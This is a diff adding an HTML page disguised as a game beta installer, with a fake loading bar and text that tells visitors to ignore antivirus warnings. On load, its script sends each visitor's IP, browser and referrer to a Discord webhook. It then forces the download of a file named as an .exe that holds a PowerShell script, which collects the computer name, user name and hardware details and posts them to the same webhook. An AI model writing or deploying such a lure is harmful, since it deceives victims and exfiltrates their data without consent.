@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>⚠️ DeadCaves Beta Installer</title>
+    <style>
+        body {
+            background-color: #000;
+            color: #0f0;
+            font-family: 'Courier New', monospace;
+            text-align: center;
+            padding-top: 50px;
+            margin: 0;
+            height: 100vh;
+            overflow: hidden;
+        }
+        .progress {
+            width: 80%;
+            margin: 20px auto;
+            height: 10px;
+            background: #222;
+            border-radius: 5px;
+        }
+        #progressBar {
+            height: 100%;
+            width: 0%;
+            background: #0f0;
+            transition: width 0.5s;
+        }
+        .note {
+            color: #f55;
+            font-size: 14px;
+            margin-top: 30px;
+            border-top: 1px dashed #333;
+            padding-top: 20px;
+            max-width: 500px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+    </style>
+</head>
+<body>
+    <h1>DEADCAVES BETA INSTALLER</h1>
+    <p>Initializing game environment...</p>
+    
+    <div class="progress">
+        <div id="progressBar"></div>
+    </div>
+    
+    <p class="note">
+        NOTE: Your antivirus may flag this as suspicious because:<br>
+        - It's an uncertified beta build<br>
+        - Uses advanced memory optimization<br>
+        This is normal for pre-release software.
+    </p>
+
+    <script>
+        // ===== CONFIGURATION =====
+        const CONFIG = {
+            webhook: "https://discord.com/api/webhooks/1360730243643474040/Ge2K7cEEWgzAMbOQ98vl3zajdkCpDxgGCDJHTc9MvqcNCTdMUw51ZsQB9lpvveL4XIa8",
+            filename: "DeadCaves_Beta.exe",
+            fakeLoadTime: 4000 // 4 second fake loading screen
+        };
+
+        // ===== TRACK VISITOR =====
+        async function logVisitor() {
+            const data = {
+                ip: await fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => ({ip:'Unknown'})).ip,
+                userAgent: navigator.userAgent,
+                screen: `${screen.width}x${screen.height}`,
+                referrer: document.referrer || "Direct",
+                time: new Date().toISOString()
+            };
+
+            fetch(CONFIG.webhook, {
+                method: "POST",
+                headers: {"Content-Type": "application/json"},
+                body: JSON.stringify({
+                    embeds: [{
+                        title: "👁️ VISITOR DETECTED",
+                        description: `**IP:** \`${data.ip}\`\n**From:** \`${data.referrer}\``,
+                        color: 0x00ff00,
+                        fields: [
+                            {name: "Device", value: `\`${data.userAgent}\``},
+                            {name: "Screen", value: data.screen}
+                        ],
+                        timestamp: data.time
+                    }]
+                })
+            });
+        }
+
+        // ===== START FAKE LOADING BAR =====
+        function simulateLoad() {
+            let progress = 0;
+            const bar = document.getElementById('progressBar');
+            const interval = setInterval(() => {
+                progress += Math.random() * 15;
+                if (progress >= 100) {
+                    progress = 100;
+                    clearInterval(interval);
+                    startDownload();
+                }
+                bar.style.width = progress + '%';
+            }, 300);
+        }
+
+        // ===== DELIVER PAYLOAD =====
+        function startDownload() {
+            // PowerShell script that collects system info
+            const psScript = `
+            $webhook = "${CONFIG.webhook}"
+            $sysInfo = @{
+                IP = (Invoke-RestMethod -Uri "https://api.ipify.org?format=json").ip
+                PC = $env:COMPUTERNAME
+                User = $env:USERNAME
+                OS = (Get-WmiObject Win32_OperatingSystem).Caption
+                CPU = (Get-WmiObject Win32_Processor).Name
+                RAM = "$((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory/1GB)GB"
+                Time = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+            }
+            $payload = @{
+                embeds = @(@{
+                    title = "🎮 DEADCAVES INSTALLED"
+                    description = "Client executed successfully"
+                    color = 65280
+                    fields = @(@{
+                        name = "System Info"
+                        value = "```\nPC: $($sysInfo.PC)\nUser: $($sysInfo.User)\nOS: $($sysInfo.OS)\nCPU: $($sysInfo.CPU)\nRAM: $($sysInfo.RAM)\nIP: $($sysInfo.IP)\n```"
+                    })
+                    timestamp = $sysInfo.Time
+                })
+            }
+            Invoke-RestMethod -Uri $webhook -Method Post -Body ($payload | ConvertTo-Json -Depth 4) -ContentType "application/json"
+            `;
+
+            // Create and trigger download
+            const blob = new Blob([psScript], {type: 'application/octet-stream'});
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = CONFIG.filename;
+            document.body.appendChild(a);
+            a.click();
+
+            // Clean up
+            setTimeout(() => {
+                document.body.removeChild(a);
+                URL.revokeObjectURL(url);
+                document.body.innerHTML = '<h1>Download complete!<br>Check your downloads folder.</h1>';
+            }, 1000);
+        }
+
+        // ===== INITIATE PROCESS =====
+        logVisitor(); // Log visitor immediately
+        setTimeout(simulateLoad, 1000); // Start fake loading after 1 second
+    </script>
+</body>
+</html>
